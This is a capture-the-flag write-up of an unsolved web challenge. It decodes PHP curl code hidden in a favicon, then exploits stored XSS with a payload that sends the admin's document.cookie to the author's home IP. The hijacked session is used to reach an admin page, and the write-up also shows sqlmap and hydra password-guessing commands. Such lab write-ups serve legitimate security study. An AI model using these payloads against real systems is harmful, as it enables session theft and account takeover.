# Level 4

![Screenshot from 2021-11-02 17-52-04](https://user-images.githubusercontent.com/82754379/139824818-c7957527-ed20-4a2d-bfc5-345324f3b95f.png)

Navigating to the provided [link](http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719) revealed the following screen:

![Screenshot from 2021-11-02 17-55-13](https://user-images.githubusercontent.com/82754379/139825132-32d52c82-38b6-4dff-a21e-9af60b13d8d2.png)

<br>

There was nothing that stood out as interesting, except for the clickable text "*Click here to pay your ransom!*" at the top right corner of the page, which directed the browser to an online form:

![Screenshot from 2021-11-02 17-57-06](https://user-images.githubusercontent.com/82754379/139825417-c48f6893-f30b-4e14-b4a4-953f9dc73eb5.png)

---

Reviewing the source code for the online form revealed that submission of the form will redirect back to "/", which basically meant it did nothing. 
(Hence the message on-screen which said "*The donation is temporarily disabled. Please do not submit.*") <br>

---

I ran **dirbuster** on the site in hopes of finding additional PHP or HTML files which might progress the investigation. But after running for more than an hour, I only got the following results:

![Screenshot from 2021-11-02 21-05-10](https://user-images.githubusercontent.com/82754379/139853231-04c68ff0-92e8-4cd8-87c3-a035ca10e185.png)

Next, I referred to the free hint:

![Screenshot from 2021-11-02 20-26-12](https://user-images.githubusercontent.com/82754379/139853304-908ebc8d-1f0f-47f5-a588-f1a3febeecba.png)

<br>

Researching **Magecart** and their associated techniques, I found a an [article](https://www.darkreading.com/attacks-breaches/magecart-how-its-attack-techniques-evolved) that mentioned they had been known to hide malicious payloads in images, including the *favicon* image. <br>
Here's the paragraph of interest reproduced from the [article](https://www.darkreading.com/attacks-breaches/magecart-how-its-attack-techniques-evolved):

---

![image](https://user-images.githubusercontent.com/82754379/139856360-6d37886a-31c0-4cbe-9064-d0ea63f78260.png)

---

Looks like I should take a closer look at the _favicon_ and other images downloaded for display on the _checkout.php_ page.
___

I downloaded the _favicon.ico_ file from http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719/favicon.ico and found that it indeed contained code:

![image](https://user-images.githubusercontent.com/82754379/139862931-6d0d6e38-167a-4396-aff5-33f38a0bad54.png)

There was a Base64-encoded portion, which I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=SkdOb1BXTjFjbXhmYVc1cGRDZ3BPMk4xY214ZmMyVjBiM0IwS0NSamFDeERWVkpNVDFCVVgxVlNUQ3dpYUhSMGNEb3ZMM013Y0hFMmMyeG1ZWFZ1ZDJKMGJYbHpaell5ZVhwdGIyUmtZWGMzY0hCcUxtTjBaaTV6WnpveE9Ea3lOaTk0WTNac2IzTjRaMkowWm1OdlptOTJlWGRpZUdSaGQzSmxaMnBpZW5GMFlTNXdhSEFpS1R0amRYSnNYM05sZEc5d2RDZ2tZMmdzUTFWU1RFOVFWRjlRVDFOVUxERXBPMk4xY214ZmMyVjBiM0IwS0NSamFDeERWVkpNVDFCVVgxQlBVMVJHU1VWTVJGTXNJakUwWXpSaU1EWmlPREkwWldNMU9UTXlNemt6TmpJMU1UZG1OVE00WWpJNVBVaHBKVEl3Wm5KdmJTVXlNSE5qWVdSaElpazdKSE5sY25abGNsOXZkWFJ3ZFhROVkzVnliRjlsZUdWaktDUmphQ2s3) to decode:

![image](https://user-images.githubusercontent.com/82754379/139863889-85bcb128-5de8-43d3-94a9-221995914161.png)

---

Here is the prettified code:

```php
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,"http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php");
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_POSTFIELDS,"14c4b06b824ec593239362517f538b29=Hi%20from%20scada");
$server_output=curl_exec($ch);
```

---

This appeared to be PHP code from the use of the *curl_init()* function (a built-in PHP function).

Accessing the URL `http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php` directly simply output the plain text:
```
Only those who knows the method is allowed.
```

I guessed the PHP script responding to the HTTP request was expecting a POST request. <br>
I tried **curl**:

```bash
curl -d "14c4b06b824ec593239362517f538b29=Hi%20from%20scada" http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php
```

and got the one-line output:

![image](https://user-images.githubusercontent.com/82754379/140694332-73c6ed20-501e-407f-b8fe-513d4ca10ec2.png)

<br>

So, a POST operation to the URL endpoint `xcvlosxgbtfcofovywbxdawregjbzqta.php` would allow me to add a record to the backend database! <br>
More importantly, we can access `http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/data/xxxxxxxxxxxxxxxxxxxxxxxxx.html` to get the browser to display what had been added. This could be an opportunity for some Cross Site Scripting exploit.


---

I tried running **dirbuster** against `http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/` and hit on on something!

![image](https://user-images.githubusercontent.com/82754379/139913891-2b130c26-e955-48b7-8018-04288126d2f5.png)

<br>

It appeared I have found additional pages at `http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/`: 
- a Login (**/login.php**) screen
- a welcome (**/index.html**) screen and 
- a data (**/data.php**) screen

---

## Welcome screen (/index.php)

![image](https://user-images.githubusercontent.com/82754379/139914881-5be91368-d608-46a4-a489-7a4c7053d727.png)


---

## Data screen (/data.php)



<br>

The previous **curl** command which I used to post content was able to _upload_ content to the database, which can then be displayed back to me via the URL `http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/data/xxxxxxxxxxxxxxxxx.html` (where `xxxxxxxxxxxxxxxxx` was in the response from the POST operation).
For example:

![image](https://user-images.githubusercontent.com/82754379/140932302-e2ef607a-bbcc-446a-973f-6934616a42d6.png)

---

On this `/data.php` screen, it mentioned that uploaded records were "Last viewed by admin". This suggested that there was some mechanism at play here to simulate that a user with admin rights was opening up the records under `../data/..`. A properly crafted record may be able to exploit the XSS vulnerability to return some useful information to me.

After some testing I found that there was indeed an XSS vulnerability in that I could get the attacker "admin" to view the contents of my POST operation and connect back to my own home PC where I was waiting with a Netcat listener, when I used the following XSS payloads (pre-URL encoding):

```html
<script src=http://<my_home_pc_IP_address>/dummy.js></script>
```
```html
<img src="http://<my_home_pc_IP_address>/image.gif"> 
```

<br>

> NOTE: In order to wait for the incoming connection from the "attacker admin" account's browser session, I had to prepare the following:
> - Set up port forwarding on my home router so that incoming connections from the Internet to port 80 are forwarded to an arbitrary port 9876 on my home PC
> - Set up a Netcat listener on my home PC listening to port 9876 and sending whatever captured traffic to a file
> - Opened up the Firewall rules on my home PC to allow incoming connections to port 9876

<br>

Now that I have confirmed an XSS vulnerability I tried to exploit it to capture the admin account's session cookie with the following XSS payload (pre-URL encoding) in the POST operation:

```html
<script>document.write('<img src="http://101.127.100.207?c='+document.cookie+'" />');</script>
```

After some trial-and-error I discovered the above payload would work only if _all_ special characters were URL-encoded (I used CyberChef to do this).
The final **curl** command I used was:

```bash
curl -d "14c4b06b824ec593239362517f538b29=%3Cscript%3Edocument%2Ewrite%28%27%3Cimg%20src%3D%22http%3A%2F%2F101%2E127%2E100%2E207%3Fc%3D%27%2Bdocument%2Ecookie%2B%27%22%20%2F%3E%27%29%3B%3C%2Fscript%3E" http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php
```

... where the IP address _101.127.100.207_ was the public IP address assigned to my home router at that time.

Within a minute of making the POST, I got the following traffic captured on my Netcat listener:

![image](https://user-images.githubusercontent.com/82754379/140933001-58f7f8d5-b492-45be-9a98-d225dd5de06b.png)

<br>

Success! Now I had the session cookie and could take over the admin account's session.
To do so, I went into Developer mode (F12) on my Google Chrome browser and modified the session cookie value under **Application => Storage => Cookies** :

![image](https://user-images.githubusercontent.com/82754379/140935009-a73be7ba-b0d9-44f2-abf0-141bf6c89db5.png)

<br>

Then I accessed the **/login.php** page and got redirected to a **/landing_admin.php** page, which had a form with 2 filter options:

---

![image](https://user-images.githubusercontent.com/82754379/140935432-bdb95d58-2370-47c0-b994-c14098c32b44.png)

---

![image](https://user-images.githubusercontent.com/82754379/140936007-8f16e07f-6e50-403a-bab3-5761f3f53823.png)

---

By trial-and-error with **curl** to make a POST with varying values for the _filter_ form parameter, like so:

```bash
curl -d "filter=isalive" -b "PHPSESSID=xxx_session_cookie_xxxx" http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/landing_admin.php
```

... I made some important observations:

- "Filter can only be 7 characters long." - this was the message I got in an HTML response when I tried values longer than 7 characters.
- The filter value was case-insensitive. A _filter_ value of "isDEAD" returned the same output as a value of "isdead".
- When the _filter_ value was valid, some interesting output was in a HTML table
- When the _filter_ value was invalid, the words "0 results" appeared in the output.
- Many special characters (including the space character) were stripped from the input _filter_ values. This has implications for an attempt to perform SQL injection as I could not use the characters `--` or `+` in place of a space, even if they were URL-encoded.
  
At this time I had to consider that the alternative was guessing a valid _filter_ value that should give me the desired output (i.e. the row of data with the encryption key in the KEY column of the output table).

Making some assumptions:

- the value for _filter_ always starts with the prefix "is" (as in "isALIVE", "isDEAD")
- the characters after the "is" prefix were only the letters A through Z (no digits)
- the characters after the "is" prefix make up a valid English word

Based on the above assumptions, I took a dictionary word list and extracted all words that were 1 to 5 characters long and ended up with a list that is around 13,600 words long. 



<br><br>










---

## Login screen (/login.php)

![image](https://user-images.githubusercontent.com/82754379/139915914-b08c8a28-7ce0-403c-957e-fa7be8000505.png)

---

### Testing for SQL Injection Vulnerability (/login.php)

Running **sqlmap** against **/login.php**:
```bash
sqlmap -forms --crawl=2 -u http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/login.php
```

**sqlmap** reported that the *username* and *password* fields in the **Login** screen do not seem to be injectable.

<br>

### Password Guessing (/login.php)

I tried password guessing against the **/login.php** screen with **THC Hyda**, using the **password.lst** that came with my version of _metasploit_ (`/usr/share/metasploit-framework/data/wordlists/password.lst`).

Very quickly I bumped into a "successful" login attempt with the password of "0" for the "admin" user account. <br>
This was because the **/login.php** page did not display the message "Invalid username or password" for this specific case. 
To work around this, I made a copy of the original password file, took out the line with "0" and then used the modified password file `newpassword.lst` instead:

```bash
hydra -l admin -P ./newpassword.lst -s 18926 188.166.189.68 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
```

Still no luck. I tried a couple of other word lists but none had a matching password for the "admin" or "palindrome" usernames.

I even wrote a Python script to generate a 1024-word list with the word "palindrome" spelled in various permutations of upper- and lowercase letters (e.g. "palindrome", "palindromE", "palindroMe", ..., "PALINDROme", "PALINDROmE", "PALINDROMe", "PALINDROME") and used that as a password list, against the user names "admin" and "palindrome", but still to no success.

---

😞 **Level 4 Challenge was not solved**
